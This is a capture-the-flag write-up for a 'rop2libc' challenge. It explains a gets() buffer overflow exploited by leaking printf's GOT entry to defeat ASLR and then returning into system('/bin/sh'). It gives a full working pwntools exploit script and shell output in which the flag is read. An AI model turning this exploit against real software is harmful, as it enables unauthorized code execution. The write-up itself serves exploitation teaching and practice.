### Solved by superkojiman

The challenge is a simple binary with a vanilla buffer overflow caused by gets() in the vuln() function. ASLR and NX were also enabled, so I needed to leak an address to be able to ret2libc. The exploit process is pretty simple:

1. Return to printf@plt to return printf()'s GOT entry.
1. We have access to the target's libc, so I can find printf()'s offset. 
1. Subtract the offset from the returned address of printf(), and I have libc's base address.
1. Now I can get system() and "/bin/sh" offsets from libc and add them to libc base to get their actual address.
1. From printf(), return to vuln() so I can overwrite EIP all over again and return to system("/bin/sh"). 

However the binary doesn't run over a socket, so I needed to launch the process from my script and communicate with it. pwntools has pwnlib.tubes.process which is an amazing wrapper for Python's subprocess that makes communication with a process so easy. To simplify things, I installed pwntools locally on the CTF's shell server they provided us. Here's the exploit:

```python
#!/usr/bin/env python
from pwn import *

# obtained from libc-database
offset_printf = 0x0004cc40
offset_system  = 0x0003fcd0
offset_binsh = 0x0015da84

buf = ""
buf += "A"*76
buf += p32(0x8048310)       # printf@plt
buf += p32(0x804844d)       # printf ret to vuln()
buf += p32(0x804852a)       # "%s\n"
buf += p32(0x804a00c)       # printf@got

# stage 1: leak libc address for printf
sh = process("/problems/rop2libc/rop2libc")
sh.sendline(buf)
print sh.recvline()
d = sh.recvline()
print "leak:", d
addr_printf = u32(d[:4])

print "addr_printf:", hex(addr_printf)

libc_base = addr_printf - offset_printf
print "libc_base:", hex(libc_base)

# local offsets
addr_system = libc_base + offset_system
addr_binsh  = libc_base + offset_binsh

print "system:", hex(addr_system)
print "/bin/sh:", hex(addr_binsh)

# stage 2: get a shell execve("/bin/sh")
buf = ""
buf += "A"*76
buf += p32(addr_system)
buf += "XXXX"
buf += p32(addr_binsh)

print "trying to get shell..."
sh.sendline(buf)
sh.interactive()
sh.close()
```

Finally, let's get that flag: 

```
team24254@shell:~$ ./sploit.py
[+] Starting program '/problems/rop2libc/rop2libc': Done
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x83\x0M\x84\x0*\x85\x0\x0c\xa0\x0

leak: @\xacY�"[�6pyV�

addr_printf: 0xf759ac40
libc_base: 0xf754e000
system: 0xf758dcd0
/bin/sh: 0xf76aba84
trying to get shell...
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��X�XXXX\x84\xbaid
uid=1028(team24254) gid=1000(ctfgroup) euid=1084(rop2libc) groups=1008(rop2libc),1000(ctfgroup)
$ cat /problems/rop2libc/flag.txt
with_file_io_aslr_bends_to_my_will
```
